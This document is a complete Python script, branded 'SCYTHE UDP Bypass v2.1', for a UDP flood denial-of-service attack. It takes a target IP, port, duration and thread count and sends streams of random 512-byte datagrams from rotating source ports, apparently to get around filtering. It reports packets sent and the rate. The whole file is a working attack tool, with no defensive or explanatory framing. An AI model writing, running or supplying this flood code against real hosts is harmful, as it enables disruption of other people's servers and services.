# SCYTHE UDP Bypass v2.1
import sys, socket, time, random, threading
if len(sys.argv) < 5: print('Usage: python3 udpbypass.py <ip> <port> <time> <threads>'); sys.exit(1)
ip, port, duration, threads = sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), int(sys.argv[4])
print(f'[SCYTHE] UDP Bypass: {ip}:{port} | {duration}s')
total = 0
lock = threading.Lock()
def flood():
  global total
  end = time.time() + duration
  while time.time() < end:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      s.bind(('0.0.0.0', random.randint(1024, 65535)))
      for _ in range(5):
        s.sendto(random._urandom(512), (ip, port))
      s.close();
      with lock: total += 5
    except: pass
for _ in range(threads):
  threading.Thread(target=flood, daemon=True).start()
start = time.time()
while time.time() - start < duration:
  print(f'[UDPBYPASS] Packets: {total} | RPS: {int(total/max(1,time.time()-start))} | Elapsed: {time.time()-start:.1f}s')
  time.sleep(1)
print(f'[UDPBYPASS] Completed: {total} packets')